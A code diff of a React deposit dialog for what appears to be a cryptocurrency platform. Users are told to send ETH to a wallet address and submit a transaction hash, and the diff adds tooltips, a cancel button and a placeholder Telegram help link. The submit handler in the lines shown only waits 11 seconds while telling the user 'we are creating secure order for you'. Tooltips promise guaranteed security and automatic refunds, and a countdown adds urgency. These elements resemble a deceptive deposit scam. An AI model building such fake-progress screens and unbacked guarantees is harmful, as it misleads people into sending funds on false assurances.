@@ -3,8 +3,14 @@ import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } f
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { CountdownTimer } from "@/components/CountdownTimer";
-import { Loader2 } from "lucide-react";
+import { Loader2, HelpCircle, ExternalLink } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+import {
+  Tooltip,
+  TooltipContent,
+  TooltipProvider,
+  TooltipTrigger,
+} from "@/components/ui/tooltip";
 
 interface DepositConfirmationDialogProps {
   isOpen: boolean;
@@ -46,7 +52,7 @@ const DepositConfirmationDialog = ({
     }
 
     setIsSubmitting(true);
-    await new Promise(resolve => setTimeout(resolve, 25000));
+    await new Promise(resolve => setTimeout(resolve, 11000)); // 11 seconds
     setIsSubmitting(false);
     
     toast({
@@ -77,11 +83,15 @@ const DepositConfirmationDialog = ({
     onClose();
   };
 
+  const handleTelegramHelp = () => {
+    window.open('https://t.me/your_support_channel', '_blank');
+  };
+
   return (
     <Dialog open={isOpen} onOpenChange={handleClose}>
       <DialogContent className="sm:max-w-md">
         <DialogHeader>
-          <DialogTitle>Deposit Confirmation</DialogTitle>
+          <DialogTitle>Deposit Process</DialogTitle>
           <DialogDescription className="space-y-4">
             {step === 'amount' ? (
               <div className="space-y-4">
@@ -107,12 +117,29 @@ const DepositConfirmationDialog = ({
               </div>
             ) : (
               <>
+                <p>We have created a request for you.</p>
+                
                 <div className="mt-4">
                   <CountdownTimer endTime={endTime} />
+                  <div className="mt-2 text-sm text-muted-foreground">
+                    <div className="flex items-start gap-2">
+                      <p>If you have already transferred Ethereum, but the timer has expired, the funds will be credited back to your original wallet.</p>
+                      <TooltipProvider>
+                        <Tooltip>
+                          <TooltipTrigger>
+                            <HelpCircle className="h-4 w-4 flex-shrink-0" />
+                          </TooltipTrigger>
+                          <TooltipContent className="max-w-sm">
+                            <p>We give time limits due to frequent fraudulent activities. During this time, the transfer is guaranteed to be secure for both parties. You cannot cancel deposits more than 3 times per 24 hours.</p>
+                          </TooltipContent>
+                        </Tooltip>
+                      </TooltipProvider>
+                    </div>
+                  </div>
                 </div>
                 
                 <div className="space-y-2 mt-4">
-                  <p>Please send {depositAmount} ETH to the following address:</p>
+                  <p>To send {depositAmount} ETH to the following address:</p>
                   <div className="bg-muted p-2 rounded-md break-all font-mono">
                     {walletAddress}
                     <div className="mt-1 text-sm text-muted-foreground">(ERC-20)</div>
@@ -120,9 +147,28 @@ const DepositConfirmationDialog = ({
                 </div>
 
                 <div className="space-y-2">
-                  <label className="text-sm font-medium">
-                    Transaction Hash
-                  </label>
+                  <div className="flex items-center gap-2">
+                    <label className="text-sm font-medium">
+                      Transaction Hash
+                    </label>
+                    <TooltipProvider>
+                      <Tooltip>
+                        <TooltipTrigger>
+                          <HelpCircle className="h-4 w-4" />
+                        </TooltipTrigger>
+                        <TooltipContent className="max-w-sm">
+                          <p>This is the transaction ID. After successful withdrawal of funds from another wallet, you will need to provide a confirmation with the number that appears in other wallet.</p>
+                          <Button 
+                            variant="link" 
+                            className="mt-2 h-auto p-0 text-primary"
+                            onClick={handleTelegramHelp}
+                          >
+                            I need help <ExternalLink className="ml-1 h-3 w-3" />
+                          </Button>
+                        </TooltipContent>
+                      </Tooltip>
+                    </TooltipProvider>
+                  </div>
                   <Input
                     value={transactionHash}
                     onChange={(e) => setTransactionHash(e.target.value)}
@@ -131,20 +177,29 @@ const DepositConfirmationDialog = ({
                   />
                 </div>
 
-                <Button 
-                  className="w-full" 
-                  onClick={handleSubmit}
-                  disabled={!transactionHash || isSubmitting}
-                >
-                  {isSubmitting ? (
-                    <>
-                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                      Processing...
-                    </>
-                  ) : (
-                    'Confirm'
-                  )}
-                </Button>
+                <div className="flex gap-2">
+                  <Button 
+                    variant="outline"
+                    className="flex-1"
+                    onClick={handleClose}
+                  >
+                    Cancel transaction
+                  </Button>
+                  <Button 
+                    className="flex-1" 
+                    onClick={handleSubmit}
+                    disabled={!transactionHash || isSubmitting}
+                  >
+                    {isSubmitting ? (
+                      <>
+                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                        Please wait, we are creating secure order for you
+                      </>
+                    ) : (
+                      'Confirm'
+                    )}
+                  </Button>
+                </div>
               </>
             )}
           </DialogDescription>
